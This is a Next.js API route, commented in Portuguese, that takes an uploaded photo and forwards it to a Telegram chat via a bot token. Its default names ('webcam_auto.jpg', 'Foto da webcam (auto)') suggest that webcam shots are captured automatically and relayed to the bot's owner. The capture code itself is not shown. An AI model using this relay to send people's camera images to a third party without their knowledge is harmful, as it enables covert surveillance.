// app/api/send-photo/route.js
import { NextResponse } from 'next/server';
import axios from 'axios';
import FormDataNode from 'form-data'; // Renomeado para evitar conflito com global FormData

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function POST(request) {
  console.log(">>> API /api/send-photo: Recebida requisição POST <<<");
  // Log dos headers recebidos (ajuda a depurar Content-Type)
  console.log("Headers recebidos:", Object.fromEntries(request.headers.entries()));

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    // ... (código de erro como antes) ...
    console.error("Erro: Variáveis de ambiente TELEGRAM_BOT_TOKEN e/ou TELEGRAM_CHAT_ID não definidas no backend!");
    return NextResponse.json({ success: false, message: "Configuração do servidor incompleta (photo)." }, { status: 500 });
  }

  try {
    console.log("Tentando processar request.formData()...");
    const clientFormData = await request.formData(); // O erro provavelmente acontece aqui se o Content-Type estiver errado
    console.log("request.formData() processado com sucesso.");

    const photoBlob = clientFormData.get('photo');

    if (!photoBlob || typeof photoBlob === 'string' || photoBlob.size === 0) {
        console.error("Arquivo de foto não encontrado, inválido ou vazio no FormData:", photoBlob);
        return NextResponse.json({ success: false, message: `Arquivo de foto não encontrado, inválido ou vazio (tamanho: ${photoBlob?.size})` }, { status: 400 });
    }

    console.log(`Foto recebida: ${photoBlob.name || 'webcam_auto.jpg'}, tamanho: ${photoBlob.size} bytes, tipo: ${photoBlob.type}`);

    // --- Restante do código para enviar ao Telegram (como antes) ---
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
    const telegramFormData = new FormDataNode(); // Usa o FormData do Node

    telegramFormData.append('chat_id', TELEGRAM_CHAT_ID);
    const photoBuffer = Buffer.from(await photoBlob.arrayBuffer());
    telegramFormData.append('photo', photoBuffer, {
        filename: photoBlob.name || 'webcam_auto.jpg',
        contentType: photoBlob.type || 'image/jpeg',
    });
    // telegramFormData.append('caption', 'Foto da webcam (auto)');

    console.log("Enviando foto para o Telegram...");
    const response = await axios.post(telegramApiUrl, telegramFormData, {
      headers: { ...telegramFormData.getHeaders() },
      maxContentLength: Infinity, maxBodyLength: Infinity
    });
    // --- Restante do tratamento da resposta do Telegram (como antes) ---
    console.log("Resposta da API do Telegram (sendPhoto):", response.status); // Removido response.data para evitar log muito grande
    if (response.data.ok) {
      console.log("Foto enviada para o Telegram com sucesso!");
      return NextResponse.json({ success: true, message: "Foto enviada ao Telegram." });
    } else {
      console.error("Erro retornado pela API do Telegram:", response.data);
      return NextResponse.json({ success: false, message: `Erro do Telegram: ${response.data.description}` }, { status: 500 });
    }

  } catch (error) {
     // Log do erro específico de formData() ou outros erros
     console.error("!!! Erro no handler /api/send-photo:", error.message);
     console.error("Stack do erro:", error.stack); // Log mais detalhado

     // Verifica se o erro é o que esperamos
     if (error instanceof TypeError && error.message.includes('Could not parse content as FormData')) {
        console.error("Causa provável: O cabeçalho Content-Type da requisição não era multipart/form-data ou estava malformado.");
        return NextResponse.json({ success: false, message: "Erro ao processar dados da imagem (formato inválido)." }, { status: 400 }); // Bad Request
     }

     // Outros erros genéricos
     if (axios.isAxiosError(error)) {
        console.error("Erro Axios ao enviar para o Telegram:", error.response?.status, error.response?.data || error.message);
     } else {
        console.error("Erro inesperado no processamento da foto:", error);
     }
     return NextResponse.json({ success: false, message: "Erro interno ao processar ou enviar a foto." }, { status: 500 });
  }
}